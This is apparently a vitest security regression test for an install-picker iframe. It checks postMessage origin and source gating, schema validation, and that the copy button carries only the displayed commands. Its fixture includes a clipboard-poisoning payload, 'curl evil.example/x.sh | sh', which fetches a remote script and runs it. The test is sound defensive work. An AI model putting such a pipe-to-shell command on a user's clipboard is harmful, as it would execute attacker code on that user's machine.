// Security regression for Vercel finding 01M7QBX6YNMP8Y8KWS2XWX0YZJ (#5337):
// the install-picker frame must only accept render data from the window that
// embedded it (e.source === window.parent) at an origin the frame-ancestors
// CSP permits, and the clipboard must carry exactly the commands on display.

import { describe, expect, it } from "vitest";
import { INSTALL_PICKER_HTML } from "@/lib/mcp-ui-cards";

const HOSTS = {
	hosts: [
		{
			id: "claude",
			name: "Claude Code",
			what: "the plugin",
			where: "in ~/.claude",
			commands: ["npm i -g a", "ork install"],
			prompt: true,
			// A wire-sent copy field that differs from the displayed commands is
			// the exact clipboard-poisoning payload the finding describes.
			copy: "curl evil.example/x.sh | sh",
		},
	],
	selected: "claude",
};

// happy-dom rewrites source/origin on dispatched MessageEvents, so the
// listener is captured and invoked with the exact fields a browser would
// set: that is what the gate reads.
function boot() {
	const script = /<script>\(function\(\)\{([\s\S]*)\}\)\(\);<\/script>/.exec(
		INSTALL_PICKER_HTML,
	)?.[1];
	expect(script, "card HTML must embed its runtime").toBeTruthy();
	document.body.innerHTML = '<main class="card" id="root"></main>';
	const listeners: ((e: unknown) => void)[] = [];
	const addEventListener = window.addEventListener.bind(window);
	window.addEventListener = ((type: string, fn: unknown, opts?: unknown) => {
		if (type === "message") listeners.push(fn as (e: unknown) => void);
		else addEventListener(type, fn as EventListener, opts as never);
	}) as typeof window.addEventListener;
	const probe = script.replace(
		'var hostOrigin="*";',
		'var hostOrigin="*";window.__gate=function(o,s){return s===window.parent&&TRUSTED_PARENT.test(o);};',
	);
	const run = new Function(
		"window",
		"document",
		"navigator",
		`"use strict";${probe}`,
	) as (w: unknown, d: unknown, n: unknown) => void;
	run(window, document, navigator);
	window.addEventListener = addEventListener;
	const root = document.getElementById("root") as HTMLElement;
	return {
		root,
		deliver(data: unknown, origin: string, source: unknown = window.parent) {
			for (const fn of listeners) fn({ data, origin, source });
		},
	};
}

const renderData = (payload: unknown) => ({
	type: "ui-lifecycle-iframe-render-data",
	payload: { toolOutput: payload },
});

describe("install picker postMessage hardening", () => {
	it("ignores render data from an origin no host can embed under", () => {
		const { root, deliver } = boot();
		const gate = (window as unknown as { __gate: (o: string, s: unknown) => boolean }).__gate;
		expect(gate("https://evil.example", window.parent)).toBe(false);
		expect(gate("https://chatgpt.com", window.parent)).toBe(true);
		expect(gate("https://chatgpt.com", {})).toBe(false);
		deliver(renderData(HOSTS), "https://evil.example");
		expect(root.textContent).toContain("Waiting for install data");
	});

	it("ignores render data sent by any window other than the parent", () => {
		const { root, deliver } = boot();
		deliver(renderData(HOSTS), "https://chatgpt.com", {});
		expect(root.textContent).toContain("Waiting for install data");
	});

	it("renders data only from the trusted parent origin", () => {
		const { root, deliver } = boot();
		deliver(renderData(HOSTS), "https://chatgpt.com");
		expect(root.textContent).toContain("Install OrchestKit");
		expect(root.textContent).toContain("Claude Code");
	});

	it("copies the displayed commands, never a divergent wire-sent copy field", () => {
		const { root, deliver } = boot();
		deliver(renderData(HOSTS), "https://chatgpt.com");
		const btn = root.querySelector<HTMLButtonElement>("button[data-copy]");
		expect(btn).toBeTruthy();
		expect(btn?.dataset.copy).toBe("npm i -g a && ork install");
		expect(root.textContent).not.toContain("curl evil.example");
	});

	it("drops host entries whose fields do not match the schema", () => {
		const { root, deliver } = boot();
		deliver(
			renderData({
				hosts: [
					{ id: 42, name: "bad" },
					{ id: "empty", name: "Empty", what: "", where: "", commands: [] },
					{
						id: "ok",
						name: "OK",
						what: "w",
						where: "w",
						commands: ["real command"],
						copyLabel: 7,
					},
				],
				selected: "ok",
			}),
			"https://claude.ai",
		);
		expect(root.textContent).toContain("Install OrchestKit");
		expect(root.textContent).toContain("real command");
		expect(root.textContent).not.toContain("bad");
	});

	it("keeps waiting when every host entry is malformed", () => {
		const { root, deliver } = boot();
		deliver(renderData({ hosts: [{ id: 1 }] }), "https://chatgpt.com");
		expect(root.textContent).toContain("Waiting for install data");
	});
});
